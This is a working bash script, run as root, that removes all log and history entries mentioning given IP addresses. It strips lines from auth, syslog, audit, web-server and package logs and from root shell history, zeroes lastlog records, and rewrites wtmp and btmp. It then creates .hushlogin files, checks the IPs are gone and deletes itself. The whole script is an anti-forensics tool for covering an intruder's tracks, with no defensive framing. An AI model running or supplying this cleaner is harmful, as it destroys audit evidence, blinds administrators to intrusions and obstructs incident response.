#!/bin/bash

green='\033[0;32m'
red='\033[31m'
yellow='\033[33m'
grey='\e[37m'
cyan='\033[96m'
nc='\033[0m'

to_clean_ip=(
	"172.20.4.80"
	"172.20.4.144"
	"172.20.4.156"
)

[[ $(id -u) -ne 0 ]] && {
	echo -e "${red}run as root${nc}"
	exit 1
}
[[ $# -ge 1 ]] && to_clean_ip=("$@")
pattern_regex=""
for i in "${to_clean_ip[@]}"; do
	[[ -z "$i" ]] && continue
	escaped="${i//./\\.}"
	[[ -n "$pattern_regex" ]] && pattern_regex+="|"
	pattern_regex+="$escaped"
done
[[ -z "$pattern_regex" ]] && {
	echo -e "${red}no IP given${nc}"
	exit 1
}
grep_ip_args=()
for i in "${to_clean_ip[@]}"; do
	[[ -n "$i" ]] && grep_ip_args+=(-e "$i")
done
script_self="$(readlink -f "$0")"

to_clean_list=(
	"/var/log/auth.log"
	"/var/log/auth.log.1"
	"/var/log/secure"
	"/var/log/syslog"
	"/var/log/syslog.1"
	"/var/log/messages"
	"/var/log/messages.1"
	"/var/log/daemon.log"
	"/var/log/kern.log"
	"/var/log/debug"
	"/var/log/audit/audit.log"
	"/var/log/audit/audit.log.1"
	"/var/log/cron"
	"/var/log/cron.log"
	"/var/log/mail.log"
	"/var/log/maillog"
	"/var/log/vsftpd.log"
	"/var/log/xferlog"
	"/var/log/apt/history.log"
	"/var/log/dpkg.log"
	"/var/log/yum.log"
	"/var/log/dnf.log"
	"/var/log/sudo.log"
	"/var/log/apache2/access.log"
	"/var/log/apache2/error.log"
	"/var/log/nginx/access.log"
	"/var/log/nginx/error.log"
	"/root/.bash_history"
	"/root/.zsh_history"
	"/root/.viminfo"
)

clean_text_file() {
	local f="$1"
	local size
	size=$(stat -c %s "$f" 2>/dev/null || echo 0)
	[[ "$size" -gt 52428800 ]] && echo -e "  ${yellow}(large file, may take a while)${nc}"
	if [[ "$f" == *.gz ]]; then
		zcat "$f" 2>/dev/null | grep -vE "$pattern_regex" | gzip >"${f}.tmp" && mv "${f}.tmp" "$f" || rm -f "${f}.tmp"
	else
		grep -vE "$pattern_regex" "$f" >"${f}.tmp" && mv "${f}.tmp" "$f" || rm -f "${f}.tmp"
	fi
}

do_clean_file() {
	local f="$1"
	[[ -f "$f" ]] || return 1
	grep -qE "$pattern_regex" "$f" 2>/dev/null || return 0
	echo -e "${green}cleaning${nc} ${cyan}$f${nc}"
	clean_text_file "$f"
}

search_paths=("$HOME" /var/log)
skip_binary_logs=("/var/log/wtmp" "/var/log/btmp" "/var/log/lastlog" "/var/log/faillog" "/var/log/utmp")
echo -e "${cyan}--- discover (grep -rFlI) ---${nc}"
while IFS= read -r f; do
	[[ -f "$f" ]] || continue
	skip=0
	for b in "${skip_binary_logs[@]}"; do [[ "$f" == "$b" ]] && skip=1 && break; done
	[[ $skip -eq 1 ]] && continue
	do_clean_file "$f"
done < <(grep -rFlI "${grep_ip_args[@]}" "${search_paths[@]}" 2>/dev/null)

echo -e "${cyan}--- fixed list ---${nc}"
for file in "${to_clean_list[@]}"; do
	if [[ -f "$file" ]]; then
		do_clean_file "$file"
	else
		echo -e "${grey}skip${nc} ${red}$file${nc} (not found)"
	fi
done

for glob in /var/log/secure-* /var/log/auth.log.* /var/log/syslog.* /var/log/messages.* /var/log/audit/audit.log.*; do
	[[ -e $glob ]] || continue
	for file in $glob; do
		do_clean_file "$file"
	done
done

LASTLOG_RECORD_SIZE=292
if [[ -f /var/log/lastlog ]]; then
	echo -e "${green}cleaning (binary)${nc} ${cyan}/var/log/lastlog${nc} (Last login)"
	while IFS= read -r user; do
		[[ -z "$user" ]] && continue
		uid=$(id -u "$user" 2>/dev/null)
		[[ -z "$uid" ]] && continue
		dd if=/dev/zero of=/var/log/lastlog bs=$LASTLOG_RECORD_SIZE seek=$uid count=1 conv=notrunc 2>/dev/null
	done < <(last -i 2>/dev/null | grep -E "$pattern_regex" | awk '{print $1}' | sort -u)
fi
touch /root/.hushlogin 2>/dev/null
[[ -n "$HOME" ]] && touch "$HOME/.hushlogin" 2>/dev/null

if command -v utmpdump &>/dev/null; then
	for binary in /var/log/wtmp /var/log/btmp; do
		[[ -f "$binary" ]] || continue
		echo -e "${green}cleaning (binary)${nc} ${cyan}$binary${nc}"
		utmpdump "$binary" 2>/dev/null | grep -vE "$pattern_regex" | utmpdump -r >"${binary}.tmp" && mv "${binary}.tmp" "$binary"
	done
else
	echo -e "${yellow}utmpdump not found, skipping wtmp/btmp (binary)${nc}"
fi

echo ""
echo -e "${cyan}--- verify ---${nc}"
fail=0
if last 2>/dev/null | grep -qE "$pattern_regex"; then
	echo -e "${red}fail${nc} last (wtmp) still contains IP(s)"
	fail=1
else
	echo -e "${green}ok${nc} last (wtmp)"
fi
if command -v utmpdump &>/dev/null; then
	for binary in /var/log/wtmp /var/log/btmp; do
		[[ -f "$binary" ]] || continue
		if utmpdump "$binary" 2>/dev/null | grep -qE "$pattern_regex"; then
			echo -e "${red}fail${nc} utmpdump $binary still contains IP(s)"
			fail=1
		else
			echo -e "${green}ok${nc} utmpdump $binary"
		fi
	done
fi
[[ $fail -eq 0 ]] && echo -e "${green}verify done, no target IP(s) in above output${nc}" || echo -e "${red}verify done, IP(s) still present, re-run or check manually${nc}"
rm -f "$script_self"
# kill -9 $PPID 2>/dev/null
exit $fail
